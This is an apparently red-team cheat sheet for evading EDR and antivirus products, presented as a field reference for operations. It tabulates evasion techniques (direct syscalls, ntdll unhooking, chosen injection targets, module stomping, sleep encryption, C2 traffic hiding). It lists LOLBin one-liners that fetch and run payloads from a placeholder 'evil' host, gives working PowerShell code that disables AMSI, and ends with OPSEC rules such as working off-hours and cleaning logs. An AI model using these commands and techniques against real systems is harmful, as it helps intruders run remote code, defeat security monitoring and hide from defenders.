# EDR/AV Bypass and Stealth Operations Quick Reference

> Source: summary of several real red team engagements (2024-2026)
> When to use: reference when operating in an environment protected by EDR/AV

---

## Detection layers and matching bypasses

| Detection layer | What the EDR does | Bypass approach |
|--------|-----------|---------|
| Static signatures | Matches known malicious file hashes/signatures | Custom compilation, encrypted payload, changed signatures |
| User-mode hooks | Hooks ntdll.dll to monitor API calls | Direct syscalls / unhooking / bring your own ntdll |
| Kernel callbacks | Registers process/thread/image load callbacks | Callback removal (needs a driver) / injection into legitimate processes |
| ETW | Collects events through ETW | Patch EtwEventWrite / disable the provider |
| Behavior analysis | Analyzes call sequences and behavior patterns | Delayed execution / spread-out operations / mimic normal behavior |
| Memory scanning | Scans process memory periodically | Heap encryption / encrypt the payload during sleep / module stomping |
| Network detection | Analyzes outbound traffic traits | Domain fronting / legitimate service tunnels / encryption |

---

## Practical bypass techniques

### 1. Direct system calls (bypass user-mode hooks)

```
Principle: call the kernel directly with the syscall instruction without going through ntdll.dll
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: bypasses every user-mode hook
```

### 2. Unhooking (restore the original ntdll)

```
Method A: remap ntdll.dll from disk
Method B: load a clean copy from the KnownDlls directory
Method C: copy the .text section from a suspended process
Effect: restores hooked APIs to their original state
```

### 3. Process injection (choose lightly monitored targets)

```
Recommended injection targets (lightly monitored):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injecting into:
- lsass.exe (heavily monitored)
- svchost.exe (watched closely by some EDRs)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
Principle: write the payload into the .text section of a loaded legitimate DLL
Effect: memory scans see a legitimate module, not suspicious RWX memory
```

### 5. Sleep encryption (Ekko/Zilean)

```
Principle: the beacon encrypts its own memory during sleep
Effect: memory scans cannot find payload signatures
Implementation: register a timer callback, encrypt before sleep, decrypt after waking
```

### 6. Call Stack Spoofing

```
Principle: forge the call stack so API calls appear to come from legitimate code
Effect: bypasses call-stack-based behavior detection
```

---

## C2 traffic stealth

| Technique | Principle | Detection difficulty |
|------|------|---------|
| Domain fronting | The SNI and the Host header of the HTTPS request differ | High |
| Cloudflare Workers | Relayed through CF, looks like normal HTTPS | High |
| Legitimate Azure/AWS services | Use cloud service APIs as the C2 channel | Very high |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long-lived connection, blends into normal web traffic | Medium |
| ICMP tunnel | Data hidden in ICMP packets | Low (easily discovered) |

---

## LOLBins (Living Off the Land)

Use legitimate programs that ship with the system to perform malicious operations:

| Program | Purpose | Command example |
|------|------|---------|
| certutil | Download files | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Run HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load a DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install an MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download files | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Run commands | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI bypass (PowerShell)

```powershell
# Classic patch (may be caught by signatures)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Stealthier approach: modify AmsiScanBuffer through reflection
# Or downgrade PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## Operational security (OpSec) principles

1. **Minimal action principle**: do not touch what you do not need to, and reuse existing credentials instead of creating new ones
2. **Time window**: operate outside the target's working hours (lowers the chance of manual review)
3. **Traffic blending**: C2 frequency and size mimic normal business traffic
4. **Tools never touch disk**: run in memory, clean up after use
5. **Log awareness**: know which operations produce which logs, and avoid them in advance or clean up afterwards
6. **Honeypot identification**: identify honeypots before operating (unusually open services, overly tempting credentials)
7. **Staged operations**: do not complete every step at once; spread them over several time windows
